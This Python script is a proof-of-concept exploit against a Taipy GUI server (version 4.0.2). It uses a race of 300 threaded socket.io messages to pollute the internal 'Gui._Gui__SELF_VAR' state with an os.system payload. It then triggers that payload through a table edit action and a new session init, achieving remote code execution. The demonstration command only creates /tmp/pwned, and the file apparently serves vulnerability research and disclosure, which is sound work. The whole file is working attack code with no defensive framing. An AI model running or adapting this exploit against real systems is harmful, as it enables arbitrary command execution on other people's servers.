import logging
import socketio
import requests
import threading
from requests.models import PreparedRequest
import time

logging.basicConfig(level=logging.INFO)

client_id = "global"
session = requests.Session()
sio = socketio.Client()

@sio.event
def connect():
    logging.info("Connected to server")

@sio.event
def message(data):
    logging.info("Message received:", data)

@sio.event
def disconnect():
    logging.info("Disconnected from server")

def warmup():
    session.get("http://127.0.0.1:5003/")
    session.get(f"http://127.0.0.1:5003/taipy-init?client_id={client_id}&v=4.0.2")
    logging.info("Warmup completed")

def trigger():
    logging.info("Pull the trigger!")
    session.get("http://127.0.0.1:5003/")
    session.get("http://127.0.0.1:5003/taipy-init?client_id=new&v=4.0.2")


def pollute(key, value):
    sio = socketio.Client()
    sio.connect('http://127.0.0.1:5003', transports=['polling'], wait_timeout=60)
    logging.info("Polluting key: " + key + " with value: " + value)
    sio.send({
        "type": "RU",
        "name": key,
        "payload": {"state_context": {key: value}, "names": []},
        "module_context": "__main__",
        "client_id": client_id
    })
    sio.disconnect()

def overwrite(key):
    sio = socketio.Client()
    sio.connect('http://127.0.0.1:5003', transports=['polling'], wait_timeout=60)
    logging.info("Overwriting key: " + key)
    sio.send({
        "type": "A",
        "name": key,
        "payload": {"action": "__gui.table_on_edit"},
        "module_context": "__main__",
        "client_id": client_id
    })
    sio.disconnect()

def run_race():
    num_pollute = 300
    barrier = threading.Barrier(num_pollute + 1)

    def pollute_race(key, value):
        barrier.wait()
        pollute(key, value)

    def overwrite_race(key):
        barrier.wait()
        overwrite(key)

    threads = []
    for i in range(num_pollute):
        payload = "__import__('os').system('touch /tmp/pwned')"
        t = threading.Thread(target=pollute_race, args=(f"Gui._Gui__SELF_VAR", payload))
        threads.append(t)
        t.start()

    t_overwrite = threading.Thread(target=overwrite_race, args=("Gui",))
    threads.append(t_overwrite)
    t_overwrite.start()

    barrier.wait()

if __name__ == "__main__":
    warmup()
    race_thread = threading.Thread(target=run_race)
    race_thread.start()
    time.sleep(3)
    trigger()